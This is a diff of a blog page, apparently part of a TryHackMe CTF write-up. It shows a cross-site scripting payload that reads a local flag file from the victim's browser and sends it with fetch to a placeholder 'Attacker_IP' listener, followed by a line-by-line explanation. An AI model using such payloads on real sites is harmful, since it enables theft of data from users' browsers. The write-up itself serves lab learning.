-<li>The fetch function sends a request to http://127.0.0.1:8080/flag.txt from the victim&rsquo;s browser.If the victim’s browser has access to this local server, it will fetch the contents of flag.txt</li>
-<li>.then(response=&gt;response.text()) onverts the response (presumably text data) into a readable format.</li>
-<li>The script constructs a URL containing the extracted data and sends it to the attacker’s server (specified by &lt;-IP-Address&gt;:994)</li>
-<li>encodeURIComponent(data) ensures that special characters in the data are properly escaped, making the URL valid</li>
-</ul>
-<p><strong>THANK YOU!</strong></p>
-
-
-  </div>
-  
-
-
-  <footer class="post-footer">
-    <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
-      <li><a href="http://localhost:1313/tags/web-security/">Web Security</a></li>
-      <li><a href="http://localhost:1313/tags/thm/">THM</a></li>
-      <li><a href="http://localhost:1313/tags/tryhackme/">TryHackMe</a></li>
-    </ul>
-<nav class="paginav">
-  <a class="prev" href="http://localhost:1313/writeups/how-to-set-up-metasploitable2/">
-    <span class="title">« Prev</span>
-    <br>
-    <span>How to set up Metasploitable Lab for Web Hacking</span>
-  </a>
-</nav>
-
-  </footer>
-</article>
-    </main>
-    
-<footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">Appiah Bismark</a></span> · 
-
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
-
-<script>
-    let menu = document.getElementById('menu')
-    if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
-
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-
-</script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
-
-</script>
-<script>
-    document.querySelectorAll('pre > code').forEach((codeblock) => {
-        const container = codeblock.parentNode.parentNode;
-
-        const copybutton = document.createElement('button');
-        copybutton.classList.add('copy-code');
-        copybutton.innerHTML = 'copy';
-
-        function copyingDone() {
-            copybutton.innerHTML = 'copied!';
-            setTimeout(() => {
-                copybutton.innerHTML = 'copy';
-            }, 2000);
-        }
-
-        copybutton.addEventListener('click', (cb) => {
-            if ('clipboard' in navigator) {
-                navigator.clipboard.writeText(codeblock.textContent);
-                copyingDone();
-                return;
-            }
-
-            const range = document.createRange();
-            range.selectNodeContents(codeblock);
-            const selection = window.getSelection();
-            selection.removeAllRanges();
-            selection.addRange(range);
-            try {
-                document.execCommand('copy');
-                copyingDone();
-            } catch (e) { };
-            selection.removeRange(range);
-        });
-
-        if (container.classList.contains("highlight")) {
-            container.appendChild(copybutton);
-        } else if (container.parentNode.firstChild == container) {
-            
-        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
-            
-            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
-        } else {
-            
-            codeblock.parentNode.appendChild(copybutton);
-        }
-    });
-</script>
-</body>
-
-</html>
+<img alt="testing XSS" loading=lazy src=/images/test2.png>
+We already know that the flag is at <code>http://10.10.139.96:8080/flag.txt</code>, so we can use a modified payload in order to receive it on our listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s1>&#39;&#34;&gt;&lt;script&gt;
+</span></span></span><span class=line><span class=cl><span class=s1>fetch(&#39;</span>http://127.0.0.1:8080/flag.txt<span class=s1>&#39;)
+</span></span></span><span class=line><span class=cl><span class=s1>.then(response =&gt; response.text())
+</span></span></span><span class=line><span class=cl><span class=s1>.then(data =&gt; {
+</span></span></span><span class=line><span class=cl><span class=s1>fetch(&#39;</span>http://Attacker_IP:994/?flag<span class=o>=</span><span class=err>&#39;</span> + encodeURIComponent<span class=o>(</span>data<span class=o>))</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=o>})</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>&lt;/script&gt;
+</span></span></code></pre></div><p><img alt=XSS loading=lazy src=/images/xss.png>
+<img alt=flag loading=lazy src=/images/flag.png></p><hr><h3 id=xss-payload-explanation>XSS Payload Explanation<a hidden class=anchor aria-hidden=true href=#xss-payload-explanation>#</a></h3><ul><li>The payload starts with &ldquo;> to break out of an HTML attribute or tag, injecting malicious JavaScript into the webpage.</li><li>The tag wraps the JavaScript code, enabling it to execute when the injected content is rendered by the victim&rsquo;s browser.</li><li>The fetch function sends a request to http://127.0.0.1:8080/flag.txt from the victim&rsquo;s browser.If the victim’s browser has access to this local server, it will fetch the contents of flag.txt</li><li>.then(response=>response.text()) onverts the response (presumably text data) into a readable format.</li><li>The script constructs a URL containing the extracted data and sends it to the attacker’s server (specified by &lt;-IP-Address>:994)</li><li>encodeURIComponent(data) ensures that special characters in the data are properly escaped, making the URL valid</li></ul><p><strong>THANK YOU!</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://kwesilarry1.github.io/tags/ctf/>Ctf</a></li><li><a href=https://kwesilarry1.github.io/tags/web-security/>Web Security</a></li><li><a href=https://kwesilarry1.github.io/tags/thm/>THM</a></li><li><a href=https://kwesilarry1.github.io/tags/tryhackme/>TryHackMe</a></li></ul><nav class=paginav><a class=prev href=https://kwesilarry1.github.io/writeups/how-to-set-up-metasploitable2/><span class=title>« Prev</span><br><span>How to set up Metasploitable Lab for Web Hacking</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://kwesilarry1.github.io/>Appiah Bismark</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
